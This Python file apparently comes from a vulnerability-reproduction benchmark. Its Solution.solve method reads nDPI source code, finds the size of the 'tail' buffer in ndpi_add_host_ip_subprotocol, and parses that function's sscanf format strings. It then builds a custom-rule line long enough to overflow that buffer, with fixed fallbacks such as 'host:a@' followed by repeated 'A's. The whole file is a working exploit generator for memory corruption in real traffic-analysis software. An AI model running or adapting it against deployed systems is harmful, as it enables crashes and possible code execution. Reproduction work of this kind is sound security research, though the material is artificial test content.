import os
import re
import tarfile
import zipfile
from typing import List, Tuple, Optional, Dict, Any


def _strip_c_comments(s: str) -> str:
    s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
    s = re.sub(r"//[^\n]*", "", s)
    return s


def _find_matching(s: str, start: int, open_ch: str, close_ch: str) -> int:
    depth = 0
    i = start
    in_str = False
    in_chr = False
    esc = False
    while i < len(s):
        c = s[i]
        if in_str:
            if esc:
                esc = False
            elif c == "\\":
                esc = True
            elif c == '"':
                in_str = False
        elif in_chr:
            if esc:
                esc = False
            elif c == "\\":
                esc = True
            elif c == "'":
                in_chr = False
        else:
            if c == '"':
                in_str = True
            elif c == "'":
                in_chr = True
            elif c == open_ch:
                depth += 1
            elif c == close_ch:
                depth -= 1
                if depth == 0:
                    return i
        i += 1
    return -1


def _split_c_args(arg_str: str) -> List[str]:
    out = []
    cur = []
    depth_par = depth_br = depth_brk = 0
    in_str = in_chr = False
    esc = False

    for c in arg_str:
        if in_str:
            cur.append(c)
            if esc:
                esc = False
            elif c == "\\":
                esc = True
            elif c == '"':
                in_str = False
            continue
        if in_chr:
            cur.append(c)
            if esc:
                esc = False
            elif c == "\\":
                esc = True
            elif c == "'":
                in_chr = False
            continue

        if c == '"':
            in_str = True
            cur.append(c)
        elif c == "'":
            in_chr = True
            cur.append(c)
        elif c == "(":
            depth_par += 1
            cur.append(c)
        elif c == ")":
            depth_par -= 1
            cur.append(c)
        elif c == "{":
            depth_br += 1
            cur.append(c)
        elif c == "}":
            depth_br -= 1
            cur.append(c)
        elif c == "[":
            depth_brk += 1
            cur.append(c)
        elif c == "]":
            depth_brk -= 1
            cur.append(c)
        elif c == "," and depth_par == 0 and depth_br == 0 and depth_brk == 0:
            out.append("".join(cur).strip())
            cur = []
        else:
            cur.append(c)

    if cur:
        out.append("".join(cur).strip())
    return [x for x in out if x != ""]


def _parse_c_string_literal(s: str, start: int) -> Tuple[str, int]:
    if start >= len(s) or s[start] != '"':
        return "", start

    def read_one(idx: int) -> Tuple[str, int]:
        assert s[idx] == '"'
        idx += 1
        buf = []
        while idx < len(s):
            c = s[idx]
            if c == '"':
                idx += 1
                break
            if c == "\\" and idx + 1 < len(s):
                n = s[idx + 1]
                if n == "n":
                    buf.append("\n")
                    idx += 2
                elif n == "t":
                    buf.append("\t")
                    idx += 2
                elif n == "r":
                    buf.append("\r")
                    idx += 2
                elif n == "0":
                    # octal escape; parse up to 3 octal digits including this one
                    j = idx + 1
                    oct_digits = []
                    while j < len(s) and len(oct_digits) < 3 and s[j] in "01234567":
                        oct_digits.append(s[j])
                        j += 1
                    try:
                        buf.append(chr(int("".join(oct_digits), 8)))
                    except Exception:
                        buf.append("\x00")
                    idx = j
                elif n == "x":
                    j = idx + 2
                    hex_digits = []
                    while j < len(s) and len(hex_digits) < 2 and s[j] in "0123456789abcdefABCDEF":
                        hex_digits.append(s[j])
                        j += 1
                    if hex_digits:
                        try:
                            buf.append(chr(int("".join(hex_digits), 16)))
                        except Exception:
                            buf.append("x")
                    else:
                        buf.append("x")
                    idx = j
                else:
                    buf.append(n)
                    idx += 2
            else:
                buf.append(c)
                idx += 1
        return "".join(buf), idx

    parts = []
    idx = start
    val, idx = read_one(idx)
    parts.append(val)
    while True:
        j = idx
        while j < len(s) and s[j].isspace():
            j += 1
        if j < len(s) and s[j] == '"':
            val2, j2 = read_one(j)
            parts.append(val2)
            idx = j2
        else:
            break
    return "".join(parts), idx


def _extract_function(text: str, func_name: str) -> Optional[str]:
    pattern = re.compile(r"\b" + re.escape(func_name) + r"\s*\([^;{]*\)\s*\{", re.S)
    m = pattern.search(text)
    if not m:
        return None
    brace_pos = text.find("{", m.start())
    if brace_pos < 0:
        return None
    end = _find_matching(text, brace_pos, "{", "}")
    if end < 0:
        return None
    return text[m.start():end + 1]


def _extract_tail_size(func_body: str) -> Tuple[Optional[int], Optional[str]]:
    m = re.search(r"\bchar\s+tail\s*\[\s*(\d+)\s*\]", func_body)
    if m:
        try:
            return int(m.group(1)), None
        except Exception:
            pass
    m2 = re.search(r"\bchar\s+tail\s*\[\s*([A-Za-z_][A-Za-z0-9_]*(?:\s*[\+\-\*/]\s*\d+|\s*)*)\s*\]", func_body)
    if m2:
        expr = m2.group(1).strip()
        return None, expr
    return None, None


def _collect_macros(files: List[str]) -> Dict[str, str]:
    macros: Dict[str, str] = {}
    define_re = re.compile(r"^\s*#\s*define\s+([A-Za-z_][A-Za-z0-9_]*)\s+(.+?)\s*$")
    for content in files:
        for line in content.splitlines():
            m = define_re.match(line)
            if not m:
                continue
            name = m.group(1)
            val = m.group(2)
            if name and val:
                macros[name] = val
    return macros


def _safe_eval_int_expr(expr: str) -> Optional[int]:
    expr = expr.strip()
    if not expr:
        return None
    expr = re.sub(r"\bsizeof\s*\([^)]*\)", "0", expr)
    expr = re.sub(r"\b[A-Za-z_][A-Za-z0-9_]*\b", "0", expr)
    if not re.fullmatch(r"[0-9\(\)\s\+\-\*/%<>&\|^~]+", expr):
        return None
    try:
        v = eval(expr, {"__builtins__": None}, {})
        if isinstance(v, int):
            return v
    except Exception:
        return None
    return None


def _resolve_tail_size(expr: str, macros: Dict[str, str]) -> Optional[int]:
    if expr is None:
        return None
    e = expr
    for _ in range(8):
        changed = False
        for name, val in macros.items():
            if re.search(r"\b" + re.escape(name) + r"\b", e):
                e2 = re.sub(r"\b" + re.escape(name) + r"\b", f"({val})", e)
                if e2 != e:
                    e = e2
                    changed = True
        if not changed:
            break
    e = re.sub(r"/\*.*?\*/", "", e, flags=re.S)
    e = re.sub(r"//[^\n]*", "", e)
    e = e.strip()
    return _safe_eval_int_expr(e)


def _parse_format_conversions(fmt: str) -> List[Dict[str, Any]]:
    convs = []
    i = 0
    while i < len(fmt):
        if fmt[i] != "%":
            i += 1
            continue
        if i + 1 < len(fmt) and fmt[i + 1] == "%":
            i += 2
            continue
        start = i
        i += 1
        suppressed = False
        if i < len(fmt) and fmt[i] == "*":
            suppressed = True
            i += 1
        width = None
        wstart = i
        while i < len(fmt) and fmt[i].isdigit():
            i += 1
        if i > wstart:
            try:
                width = int(fmt[wstart:i])
            except Exception:
                width = None
        if fmt.startswith("hh", i) or fmt.startswith("ll", i):
            i += 2
        elif i < len(fmt) and fmt[i] in "hljztLqI":
            i += 1
            if fmt.startswith("32", i) or fmt.startswith("64", i):
                i += 2
        if i >= len(fmt):
            break
        conv = fmt[i]
        scanset = None
        scanset_invert = None
        if conv == "[":
            i += 1
            invert = False
            if i < len(fmt) and fmt[i] == "^":
                invert = True
                i += 1
            if i < len(fmt) and fmt[i] == "]":
                i += 1
            set_start = i
            while i < len(fmt) and fmt[i] != "]":
                i += 1
            scanset = fmt[set_start:i]
            scanset_invert = invert
            if i < len(fmt) and fmt[i] == "]":
                i += 1
            conv = "["
        else:
            i += 1
        end = i
        convs.append({
            "start": start,
            "end": end,
            "conv": conv,
            "suppressed": suppressed,
            "width": width,
            "scanset": scanset,
            "scanset_invert": scanset_invert
        })
    return convs


def _choose_char_for_scanset(scanset: str, invert: bool) -> str:
    if scanset is None:
        return "A"
    s = scanset

    def in_set(ch: str) -> bool:
        i = 0
        while i < len(s):
            if i + 2 < len(s) and s[i + 1] == "-" and s[i] != "\\" and s[i + 2] != "\\":
                a = s[i]
                b = s[i + 2]
                if a <= ch <= b or b <= ch <= a:
                    return True
                i += 3
            else:
                if s[i] == ch:
                    return True
                i += 1
        return False

    if invert:
        for ch in "A1B2C3D4E5F6G7H8I9J0":
            if not in_set(ch) and not ch.isspace():
                return ch
        return "Z"
    else:
        for ch in "A1a0Z9b2c3d4e5f6g7":
            if in_set(ch) and not ch.isspace():
                return ch
        i = 0
        while i < len(s):
            if i + 2 < len(s) and s[i + 1] == "-":
                return s[i]
            if not s[i].isspace():
                return s[i]
            i += 1
        return "A"


def _build_input_from_format(fmt: str, tail_conv_arg_index: int, overflow_len: int) -> str:
    convs = _parse_format_conversions(fmt)

    # map non-suppressed conversions to argument indices (0-based among varargs)
    arg_map = []
    for c in convs:
        if c["conv"] == "%":
            continue
        if c["suppressed"]:
            continue
        arg_map.append(c)

    if tail_conv_arg_index < 0 or tail_conv_arg_index >= len(arg_map):
        tail_conv = None
    else:
        tail_conv = arg_map[tail_conv_arg_index]

    def token_for_conv(c: Dict[str, Any], is_tail: bool) -> str:
        conv = c["conv"]
        width = c["width"]
        if conv == "n":
            return ""
        if conv in ("d", "i", "u", "x", "X", "o"):
            return "1"
        if conv in ("f", "F", "g", "G", "e", "E", "a", "A"):
            return "1"
        if conv == "p":
            return "0"
        if conv == "c":
            w = width if isinstance(width, int) and width > 0 else 1
            ch = "A"
            if is_tail:
                # %c doesn't null-terminate; but shouldn't be used for tail; still make it long
                w = max(w, overflow_len)
            return ch * w
        if conv in ("s", "["):
            if is_tail:
                if overflow_len <= 0:
                    overflow_len2 = 64
                else:
                    overflow_len2 = overflow_len
                if conv == "[":
                    ch = _choose_char_for_scanset(c.get("scanset"), bool(c.get("scanset_invert")))
                    return ch * overflow_len2
                return "A" * overflow_len2
            else:
                if conv == "[":
                    ch = _choose_char_for_scanset(c.get("scanset"), bool(c.get("scanset_invert")))
                    return ch
                return "A"
        # unknown conv: give something non-empty
        return "A"

    out = []
    pos = 0
    tail_set = set()
    if tail_conv is not None:
        tail_set.add(id(tail_conv))

    # Need to generate by walking through format string and replacing conversion specs with tokens
    non_supp_arg_idx = -1
    i = 0
    while i < len(fmt):
        if fmt[i] == "%":
            if i + 1 < len(fmt) and fmt[i + 1] == "%":
                out.append("%")
                i += 2
                continue
            # parse conversion spec to match convs list
            # find current conv entry starting at i
            match = None
            for c in convs:
                if c["start"] == i:
                    match = c
                    break
            if match is None:
                # fallback: skip '%'
                i += 1
                continue
            literal_part = ""
            # no literal part to add here; handled in normal flow
            i2 = match["end"]
            if not match["suppressed"]:
                non_supp_arg_idx += 1
            is_tail = (not match["suppressed"]) and (non_supp_arg_idx == tail_conv_arg_index)
            out.append(token_for_conv(match, is_tail))
            i = i2
        else:
            if fmt[i].isspace():
                # any whitespace in format consumes any amount; output single space for separation
                if not out or (out and out[-1] and not out[-1].endswith(" ")):
                    out.append(" ")
                i += 1
                while i < len(fmt) and fmt[i].isspace():
                    i += 1
            else:
                out.append(fmt[i])
                i += 1

    s = "".join(out)
    s = re.sub(r" +", " ", s).strip()
    return s


def _read_text_from_archive(src_path: str, member_suffix: str) -> Optional[str]:
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                if fn == os.path.basename(member_suffix) and os.path.join(root, fn).endswith(member_suffix):
                    try:
                        with open(os.path.join(root, fn), "rb") as f:
                            return f.read().decode("utf-8", errors="ignore")
                    except Exception:
                        return None
        p = os.path.join(src_path, member_suffix)
        if os.path.exists(p):
            try:
                with open(p, "rb") as f:
                    return f.read().decode("utf-8", errors="ignore")
            except Exception:
                return None
        return None

    if zipfile.is_zipfile(src_path):
        try:
            with zipfile.ZipFile(src_path, "r") as zf:
                candidates = [n for n in zf.namelist() if n.endswith(member_suffix)]
                if not candidates:
                    return None
                name = sorted(candidates, key=len)[0]
                return zf.read(name).decode("utf-8", errors="ignore")
        except Exception:
            return None

    try:
        with tarfile.open(src_path, "r:*") as tf:
            candidates = [m for m in tf.getmembers() if m.name.endswith(member_suffix)]
            if not candidates:
                return None
            m = sorted(candidates, key=lambda x: len(x.name))[0]
            f = tf.extractfile(m)
            if f is None:
                return None
            data = f.read()
            return data.decode("utf-8", errors="ignore")
    except Exception:
        return None


def _read_many_texts_from_archive(src_path: str, suffixes: List[str]) -> List[str]:
    out = []
    if os.path.isdir(src_path):
        for suf in suffixes:
            t = _read_text_from_archive(src_path, suf)
            if t is not None:
                out.append(t)
        return out

    if zipfile.is_zipfile(src_path):
        try:
            with zipfile.ZipFile(src_path, "r") as zf:
                names = zf.namelist()
                for suf in suffixes:
                    cand = [n for n in names if n.endswith(suf)]
                    if cand:
                        name = sorted(cand, key=len)[0]
                        out.append(zf.read(name).decode("utf-8", errors="ignore"))
        except Exception:
            pass
        return out

    try:
        with tarfile.open(src_path, "r:*") as tf:
            members = tf.getmembers()
            for suf in suffixes:
                cand = [m for m in members if m.name.endswith(suf)]
                if not cand:
                    continue
                m = sorted(cand, key=lambda x: len(x.name))[0]
                f = tf.extractfile(m)
                if f is None:
                    continue
                out.append(f.read().decode("utf-8", errors="ignore"))
    except Exception:
        pass
    return out


def _find_sscanf_calls_with_tail(func_body: str) -> List[Dict[str, Any]]:
    calls = []
    # scan for "sscanf(" and "__isoc99_sscanf("
    for m in re.finditer(r"\b(?:__isoc99_sscanf|sscanf)\s*\(", func_body):
        start = m.start()
        paren_pos = func_body.find("(", m.end() - 1)
        if paren_pos < 0:
            continue
        end = _find_matching(func_body, paren_pos, "(", ")")
        if end < 0:
            continue
        call_inside = func_body[paren_pos + 1:end]
        args = _split_c_args(call_inside)
        if len(args) < 3:
            continue
        fmt_expr = args[1].lstrip()
        if not fmt_expr.startswith('"'):
            continue
        fmt, _ = _parse_c_string_literal(fmt_expr, fmt_expr.find('"'))
        varargs = args[2:]
        tail_pos = None
        for i, a in enumerate(varargs):
            if re.search(r"\btail\b", a):
                tail_pos = i
                break
        if tail_pos is None:
            continue
        calls.append({
            "start": start,
            "end": end,
            "args": args,
            "fmt": fmt,
            "tail_vararg_index": tail_pos,
        })
    return calls


class Solution:
    def solve(self, src_path: str) -> bytes:
        ndpi_main = _read_text_from_archive(src_path, "src/lib/ndpi_main.c")
        if ndpi_main is None:
            # fallback: try any ndpi_main.c
            ndpi_main = _read_text_from_archive(src_path, "ndpi_main.c")
        if ndpi_main is None:
            return (b"A" * 256) + b"\n"

        ndpi_main_nc = _strip_c_comments(ndpi_main)
        func = _extract_function(ndpi_main_nc, "ndpi_add_host_ip_subprotocol")
        if func is None:
            return (b"A" * 256) + b"\n"

        tail_size, tail_expr = _extract_tail_size(func)
        if tail_size is None and tail_expr:
            hdrs = _read_many_texts_from_archive(
                src_path,
                [
                    "src/include/ndpi_api.h",
                    "src/include/ndpi_typedefs.h",
                    "src/include/ndpi_main.h",
                    "src/lib/ndpi_main.c",
                    "include/ndpi_api.h",
                    "include/ndpi_typedefs.h",
                    "include/ndpi_main.h",
                ],
            )
            macros = _collect_macros(hdrs + [ndpi_main_nc])
            ts = _resolve_tail_size(tail_expr, macros)
            if ts is not None and ts > 0:
                tail_size = ts

        if tail_size is None or tail_size <= 0 or tail_size > 1_000_000:
            tail_size = 64

        calls = _find_sscanf_calls_with_tail(func)
        best = None
        best_line = None
        for c in calls:
            fmt = c["fmt"]
            convs = _parse_format_conversions(fmt)

            # map vararg indices to conversion indices (non-suppressed, excluding %%)
            non_supp = []
            for cc in convs:
                if cc["conv"] == "%":
                    continue
                if cc["suppressed"]:
                    continue
                non_supp.append(cc)

            tail_arg_idx = c["tail_vararg_index"]
            if tail_arg_idx < 0 or tail_arg_idx >= len(non_supp):
                continue
            tail_conv = non_supp[tail_arg_idx]
            conv_type = tail_conv["conv"]
            width = tail_conv["width"]

            # overflow likely if width is missing or >= tail_size
            if conv_type not in ("s", "["):
                continue
            if width is not None and width < tail_size:
                continue

            overflow_len = tail_size
            line = _build_input_from_format(fmt, tail_arg_idx, overflow_len)
            if not line:
                continue
            bline = (line + "\n").encode("ascii", errors="ignore")
            if best_line is None or len(bline) < len(best_line):
                best_line = bline
                best = c

        if best_line is not None and len(best_line) > 0:
            return best_line

        # Conservative fallback: common rule patterns in nDPI custom rules; long tail
        overflow = b"A" * tail_size
        candidates = [
            b"host:a@" + overflow + b"\n",
            b"ip:1.1.1.1@" + overflow + b"\n",
            b"1.1.1.1," + overflow + b"\n",
            b"a," + overflow + b"\n",
        ]
        return min(candidates, key=len)